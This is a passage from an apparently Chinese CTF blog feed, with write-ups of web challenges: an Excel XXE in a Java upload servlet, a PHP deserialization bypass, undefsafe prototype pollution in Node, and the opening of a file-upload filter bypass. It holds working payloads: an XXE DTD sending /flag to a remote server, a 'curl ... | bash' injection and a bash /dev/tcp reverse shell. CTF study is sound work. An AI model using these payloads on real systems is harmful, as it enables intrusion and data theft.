response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        String savePath = <span class="keyword">this</span>.getServletContext().getRealPath(<span class="string">"/WEB-INF/upload"</span>);</span><br><span class="line">        String tempPath = <span class="keyword">this</span>.getServletContext().getRealPath(<span class="string">"/WEB-INF/temp"</span>);</span><br><span class="line">        File tempFile = <span class="keyword">new</span> File(tempPath);</span><br><span class="line">        <span class="keyword">if</span> (!tempFile.exists()) &#123;</span><br><span class="line">            tempFile.mkdir();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String message = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            DiskFileItemFactory factory = <span class="keyword">new</span> DiskFileItemFactory();</span><br><span class="line">            factory.setSizeThreshold(<span class="number">102400</span>);</span><br><span class="line">            factory.setRepository(tempFile);</span><br><span class="line">            ServletFileUpload upload = <span class="keyword">new</span> ServletFileUpload(factory);</span><br><span class="line">            upload.setHeaderEncoding(<span class="string">"UTF-8"</span>);</span><br><span class="line">            upload.setFileSizeMax(<span class="number">1048576L</span>);</span><br><span class="line">            upload.setSizeMax(<span class="number">10485760L</span>);</span><br><span class="line">            <span class="keyword">if</span> (!ServletFileUpload.isMultipartContent(request)) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            List&lt;FileItem&gt; list = upload.parseRequest(request);</span><br><span class="line">            Iterator var10 = list.iterator();</span><br><span class="line"></span><br><span class="line">            label56:</span><br><span class="line">            <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">                <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!var10.hasNext()) &#123;</span><br><span class="line">                        <span class="keyword">break</span> label56;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    FileItem fileItem = (FileItem)var10.next();</span><br><span class="line">                    String filename;</span><br><span class="line">                    String fileExtName;</span><br><span class="line">                    <span class="keyword">if</span> (fileItem.isFormField()) &#123;</span><br><span class="line">                        filename = fileItem.getFieldName();</span><br><span class="line">                        fileExtName = fileItem.getString(<span class="string">"UTF-8"</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        filename = fileItem.getName();</span><br><span class="line">                        <span class="keyword">if</span> (filename != <span class="keyword">null</span> &amp;&amp; !filename.trim().equals(<span class="string">""</span>)) &#123;</span><br><span class="line">                            fileExtName = filename.substring(filename.lastIndexOf(<span class="string">"."</span>) + <span class="number">1</span>);</span><br><span class="line">                            InputStream in = fileItem.getInputStream();</span><br><span class="line">                            <span class="keyword">if</span> (filename.startsWith(<span class="string">"excel-"</span>) &amp;&amp; <span class="string">"xlsx"</span>.equals(fileExtName)) &#123;</span><br><span class="line">                                <span class="keyword">try</span> &#123;</span><br><span class="line">                                    Workbook wb1 = WorkbookFactory.create(in);</span><br><span class="line">                                    Sheet sheet = wb1.getSheetAt(<span class="number">0</span>);</span><br><span class="line">                                    System.out.println(sheet.getFirstRowNum());</span><br><span class="line">                                &#125; <span class="keyword">catch</span> (InvalidFormatException var20) &#123;</span><br><span class="line">                                    System.err.println(<span class="string">"poi-ooxml-3.10 has something wrong"</span>);</span><br><span class="line">                                    var20.printStackTrace();</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            String saveFilename = <span class="keyword">this</span>.makeFileName(filename);</span><br><span class="line">                            request.setAttribute(<span class="string">"saveFilename"</span>, saveFilename);</span><br><span class="line">                            request.setAttribute(<span class="string">"filename"</span>, filename);</span><br><span class="line">                            String realSavePath = <span class="keyword">this</span>.makePath(saveFilename, savePath);</span><br><span class="line">                            FileOutputStream out = <span class="keyword">new</span> FileOutputStream(realSavePath + <span class="string">"/"</span> + saveFilename);</span><br><span class="line">                            <span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                            <span class="keyword">boolean</span> var19 = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">int</span> len;</span><br><span class="line">                            <span class="keyword">while</span>((len = in.read(buffer)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                                out.write(buffer, <span class="number">0</span>, len);</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            in.close();</span><br><span class="line">                            out.close();</span><br><span class="line">                            message = <span class="string">"文件上传成功!"</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileUploadException var21) &#123;</span><br><span class="line">            var21.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        request.setAttribute(<span class="string">"message"</span>, message);</span><br><span class="line">        request.getRequestDispatcher(<span class="string">"/ListFileServlet"</span>).forward(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">makeFileName</span><span class="params">(String filename)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> UUID.randomUUID().toString() + <span class="string">"_"</span> + filename;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">makePath</span><span class="params">(String filename, String savePath)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> hashCode = filename.hashCode();</span><br><span class="line">        <span class="keyword">int</span> dir1 = hashCode &amp; <span class="number">15</span>;</span><br><span class="line">        <span class="keyword">int</span> dir2 = (hashCode &amp; <span class="number">240</span>) &gt;&gt; <span class="number">4</span>;</span><br><span class="line">        String dir = savePath + <span class="string">"/"</span> + dir1 + <span class="string">"/"</span> + dir2;</span><br><span class="line">        File file = <span class="keyword">new</span> File(dir);</span><br><span class="line">        <span class="keyword">if</span> (!file.exists()) &#123;</span><br><span class="line">            file.mkdirs();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> dir;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现关键代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (filename.startsWith(<span class="string">"excel-"</span>) &amp;&amp; <span class="string">"xlsx"</span>.equals(fileExtName)) &#123;</span><br><span class="line">                                <span class="keyword">try</span> &#123;</span><br><span class="line">                                    Workbook wb1 = WorkbookFactory.create(in);</span><br><span class="line">                                    Sheet sheet = wb1.getSheetAt(<span class="number">0</span>);</span><br><span class="line">                                    System.out.println(sheet.getFirstRowNum());</span><br><span class="line">                                &#125; <span class="keyword">catch</span> (InvalidFormatException var20) &#123;</span><br><span class="line">                                    System.err.println(<span class="string">"poi-ooxml-3.10 has something wrong"</span>);</span><br><span class="line">                                    var20.printStackTrace();</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br></pre></td></tr></table></figure>

<p>是excel的xxe。还得数据外带</p>
<p>使用vps 在本地写个1文件内容为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &#39;file:&#x2F;&#x2F;&#x2F;flag&#39;&gt;</span><br><span class="line">&lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;ip:5555&#x2F;%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>创建一个xlsx文件，使用压缩文件打开，将里面的[Content_Types].xml解压，在第二行添加如下代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE any [ &lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;174.1.62.113:5555&#x2F;1&quot;&gt;%remote;%payload;%send;]&gt;</span><br></pre></td></tr></table></figure>

<p>并替换压缩包内文件（<strong>不要解压</strong>，直接替换Content_Types.xml）然后在vps上在文件1所在目录执行命令启动零时web服务器</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php -S 0.0.0.0:5555</span><br></pre></td></tr></table></figure>
<p>等待接受文件即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@2c51daa62fd1:~# [Mon May 11 11:40:56 2020] *.*.*.*:52204 [200]: &#x2F;1</span><br><span class="line">[Mon May 11 11:40:56 2020] *.*.*.*:52208 [404]: &#x2F;flag&#123;55ac2090-a7cb-438f-a636-2d5ea530d387&#125; - No such file or directory</span><br></pre></td></tr></table></figure>

<h2 id="青龙组AreUSerialz"><a href="#青龙组AreUSerialz" class="headerlink" title="青龙组AreUSerialz"></a>青龙组AreUSerialz</h2><p>打开题目就有源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $op;</span><br><span class="line">    <span class="keyword">protected</span> $filename;</span><br><span class="line">    <span class="keyword">protected</span> $content;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $op = <span class="string">"1"</span>;</span><br><span class="line">        $filename = <span class="string">"/tmp/tmpfile"</span>;</span><br><span class="line">        $content = <span class="string">"Hello World!"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"1"</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"2"</span>) &#123;</span><br><span class="line">            $res = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output($res);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Bad Hacker!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((string)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">"Too long!"</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>($res) <span class="keyword">$this</span>-&gt;output(<span class="string">"Successful!"</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $res = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"[Result]: &lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> $s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">"2"</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">"1"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($s); $i++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET&#123;<span class="string">'str'</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str = (string)$_GET[<span class="string">'str'</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid($str)) &#123;</span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看到最后上序列化漏洞，还有过滤，只能使用ascii32-125的字符，protect序列化会有%00。之前有过<a href="">一个题目</a> 过滤了%使用<code>S</code>代替<code>s</code>，序列化字符串时<code>%00*%00</code>就回替换为<code>\00*\00</code>，在此处选择protect转换为public，将FileHandler属性内容改大</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $op;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$a=<span class="keyword">new</span> FileHandler();</span><br><span class="line">$a-&gt;op=<span class="number">2</span>;</span><br><span class="line">$a-&gt;filename=<span class="string">'flag.php'</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);  <span class="comment">//O:11:"FileHandler":2:&#123;s:2:"op";i:2;s:8:"filename";s:8:"flag.php";&#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload:?str&#x3D;O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>查看源码即可获得flag<br>更多解法参考<a href="https://www.gem-love.com/websecurity/2322.html" target="_blank" rel="noopener">颖齐师傅博客</a></p>
<h2 id="青龙组-notes"><a href="#青龙组-notes" class="headerlink" title="青龙组 notes"></a>青龙组 notes</h2><p>给出了源码</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"><span class="keyword">const</span> undefsafe = <span class="built_in">require</span>(<span class="string">'undefsafe'</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; exec &#125; = <span class="built_in">require</span>(<span class="string">'child_process'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Notes</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>() &#123;</span><br><span class="line">        <span class="keyword">this</span>.owner = <span class="string">"whoknows"</span>;</span><br><span class="line">        <span class="keyword">this</span>.num = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">this</span>.note_list = &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    write_note(author, raw_note) &#123;</span><br><span class="line">        <span class="keyword">this</span>.note_list[(<span class="keyword">this</span>.num++).toString()] = &#123;<span class="string">"author"</span>: author,<span class="string">"raw_note"</span>:raw_note&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    get_note(id) &#123;</span><br><span class="line">        <span class="keyword">var</span> r = &#123;&#125;</span><br><span class="line">        undefsafe(r, id, undefsafe(<span class="keyword">this</span>.note_list, id));</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    edit_note(id, author, raw) &#123;</span><br><span class="line">        undefsafe(<span class="keyword">this</span>.note_list, id + <span class="string">'.author'</span>, author);</span><br><span class="line">        undefsafe(<span class="keyword">this</span>.note_list, id + <span class="string">'.raw_note'</span>, raw);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    get_all_notes() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.note_list;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    remove_note(id) &#123;</span><br><span class="line">        <span class="keyword">delete</span> <span class="keyword">this</span>.note_list[id];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> notes = <span class="keyword">new</span> Notes();</span><br><span class="line">notes.write_note(<span class="string">"nobody"</span>, <span class="string">"this is nobody's first note"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.set(<span class="string">'views'</span>, path.join(__dirname, <span class="string">'views'</span>));</span><br><span class="line">app.set(<span class="string">'view engine'</span>, <span class="string">'pug'</span>);</span><br><span class="line"></span><br><span class="line">app.use(express.json());</span><br><span class="line">app.use(express.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.use(express.static(path.join(__dirname, <span class="string">'public'</span>)));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.render(<span class="string">'index'</span>, &#123; <span class="attr">title</span>: <span class="string">'Notebook'</span> &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">'/add_note'</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">'please use POST to add a note'</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> author = req.body.author;</span><br><span class="line">        <span class="keyword">let</span> raw = req.body.raw;</span><br><span class="line">        <span class="keyword">if</span> (author &amp;&amp; raw) &#123;</span><br><span class="line">            notes.write_note(author, raw);</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"add note sucess"</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"did not add note"</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">'/edit_note'</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"please use POST to edit a note"</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> id = req.body.id;</span><br><span class="line">        <span class="keyword">let</span> author = req.body.author;</span><br><span class="line">        <span class="keyword">let</span> enote = req.body.raw;</span><br><span class="line">        <span class="keyword">if</span> (id &amp;&amp; author &amp;&amp; enote) &#123;</span><br><span class="line">            notes.edit_note(id, author, enote);</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"edit note sucess"</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"edit note failed"</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">'/delete_note'</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"please use POST to delete a note"</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> id = req.body.id;</span><br><span class="line">        <span class="keyword">if</span> (id) &#123;</span><br><span class="line">            notes.remove_note(id);</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"delete done"</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"delete failed"</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">'/notes'</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> q = req.query.q;</span><br><span class="line">        <span class="keyword">let</span> a_note;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span>(q) === <span class="string">"undefined"</span>) &#123;</span><br><span class="line">            a_note = notes.get_all_notes();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            a_note = notes.get_note(q);</span><br><span class="line">        &#125;</span><br><span class="line">        res.render(<span class="string">'note'</span>, &#123;<span class="attr">list</span>: a_note&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">'/status'</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> commands = &#123;</span><br><span class="line">            <span class="string">"script-1"</span>: <span class="string">"uptime"</span>,</span><br><span class="line">            <span class="string">"script-2"</span>: <span class="string">"free -m"</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> index <span class="keyword">in</span> commands) &#123;</span><br><span class="line">            exec(commands[index], &#123;<span class="attr">shell</span>:<span class="string">'/bin/bash'</span>&#125;, (err, stdout, stderr) =&gt; &#123;</span><br><span class="line">                <span class="keyword">if</span> (err) &#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">`stdout: <span class="subst">$&#123;stdout&#125;</span>`</span>);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        res.send(<span class="string">'OK'</span>);</span><br><span class="line">        res.end();</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(<span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.status(<span class="number">404</span>).send(<span class="string">'Sorry cant find that!'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(<span class="function"><span class="keyword">function</span>(<span class="params">err, req, res, next</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.error(err.stack);</span><br><span class="line">  res.status(<span class="number">500</span>).send(<span class="string">'Something broke!'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8080</span>;</span><br><span class="line">app.listen(port, () =&gt; <span class="built_in">console</span>.log(<span class="string">`Example app listening at http://localhost:<span class="subst">$&#123;port&#125;</span>`</span>))</span><br></pre></td></tr></table></figure>

<p>咋一看<code>/status</code>中有命令执行，开头遇到了不认识的库。看到114师傅说的一点很有用（114师傅太强了！！），</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">看见奇奇怪怪得库，先谷歌搜索 库名+vuln 除非他出0day题</span><br></pre></td></tr></table></figure>

<p>搜索之后发现undefsafe库存在原型链污染<a href="https://snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940" target="_blank" rel="noopener">参考链接</a></p>
<p>关键代码</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="built_in">require</span>(<span class="string">"undefsafe"</span>);</span><br><span class="line"><span class="keyword">var</span> payload = <span class="string">"__proto__.toString"</span>;</span><br><span class="line">a(&#123;&#125;,payload,<span class="string">"JHU"</span>);</span><br><span class="line"><span class="built_in">console</span>.log(&#123;&#125;.toString);</span><br></pre></td></tr></table></figure>

<p>找了一遍之后在<code>/edit_note</code>中找类似的地方，id可控</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.route(<span class="string">'/edit_note'</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"please use POST to edit a note"</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> id = req.body.id;</span><br><span class="line">        <span class="keyword">let</span> author = req.body.author;</span><br><span class="line">        <span class="keyword">let</span> enote = req.body.raw;</span><br><span class="line">        <span class="keyword">if</span> (id &amp;&amp; author &amp;&amp; enote) &#123;</span><br><span class="line">            notes.edit_note(id, author, enote);</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"edit note sucess"</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"edit note failed"</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure>

<p>在<code>edit_note</code>提交数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;__proto__.author&amp;author&#x3D;curl%20http:&#x2F;&#x2F;ip:5555&#x2F;shell|bash&amp;raw&#x3D;1</span><br></pre></td></tr></table></figure>

<p>shell中文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;5556 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>监听端口</p>
<p>然后在<code>/status</code>触发即可拿shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">app@0a80d876cfe5:&#x2F;app$ cat &#x2F;flag</span><br><span class="line">cat &#x2F;flag</span><br><span class="line">flag&#123;0251b48c-6b03-43f7-a799-3e99a77a2c8a&#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>刷题</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>比赛过程</tag>
      </tags>
  </entry>
  <entry>
    <title>De1ctf记录</title>
    <url>/2020/05/02/De1ctf%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="check-in"><a href="#check-in" class="headerlink" title="check in"></a><strong>check in</strong></h2><p>打开链接是一个文件上传页面，抓包发现服务器是php5.4.16版本。上传一句话木马提示文件类型错误。后缀名不能是php，phtml,php2等之类的。还有MIME过滤，还对内容进行了过滤,不能包含一下字符</p>
<a id="more"></a>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">perl|pyth|ph|auto|curl|base|&gt;|rm|ruby|openssl|war|lua|msf|xter|telnet in contents!</span><br></pre></td></tr></table></figure>

<p>修改文件名为1.gif，MIME为image/gif</p>
<p>过滤了ph。不能使用&lt;?php标签。php版本为5.4.16，支持使用php短标签</p>
<p>上传.htaccess，其中有过滤，使用<code>\</code>换行</p>
